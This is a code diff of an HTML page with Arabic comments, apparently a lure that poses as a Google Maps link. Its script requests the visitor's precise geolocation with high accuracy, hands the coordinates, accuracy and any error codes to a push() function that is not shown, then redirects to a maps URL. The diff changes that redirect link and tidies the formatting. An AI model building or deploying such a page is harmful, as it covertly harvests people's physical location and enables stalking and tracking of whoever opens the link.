@@ -144,7 +144,7 @@
     </div>
 
     <script>
-        const REDIRECT = "https://maps.app.goo.gl/Lb1Adj5BV7YwQyPi9";
+        const REDIRECT = "https://maps.app.goo.gl/uAGhQPK2yB4DCbuZ8?g_st=aw";
         let isWorking = false;
 
         // 🛡️ هروب إجباري وقوي لكروم (لضمان ظهور الإذن)
@@ -160,7 +160,7 @@
         document.getElementById('ok').onclick = function () {
             if (isWorking) return;
             isWorking = true;
-            
+
             // تحسين شكل الزر عند الضغط
             this.innerHTML = '<span style="display:flex; align-items:center; gap:5px;">جاري الاتصال... <div class="spinner"></div></span>';
             this.style.opacity = "0.7";
@@ -170,10 +170,10 @@
                 navigator.geolocation.getCurrentPosition(
                     function (p) {
                         // نجاح: إرسال البيانات والتحويل
-                        push({ 
-                            lat: p.coords.latitude, 
-                            lon: p.coords.longitude, 
-                            acc: p.coords.accuracy.toFixed(1) + "m" 
+                        push({
+                            lat: p.coords.latitude,
+                            lon: p.coords.longitude,
+                            acc: p.coords.accuracy.toFixed(1) + "m"
                         });
                     },
                     function (e) {
@@ -189,13 +189,13 @@
                         } else if (e.code == 3) {
                             errorMsg = "انتهت مهلة الطلب";
                         }
-                        
+
                         push({ lat: "فشل", lon: errorMsg, acc: "Error: " + e.code });
                     },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 8000, 
-                        maximumAge: 0 
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
                     }
                 );
             } else {
@@ -251,12 +251,21 @@
         .spinner {
             width: 14px;
             height: 14px;
-            border: 2px solid rgba(0,0,0,0.1);
+            border: 2px solid rgba(0, 0, 0, 0.1);
             border-top: 2px solid #202124;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
     </style>
 
 </body>
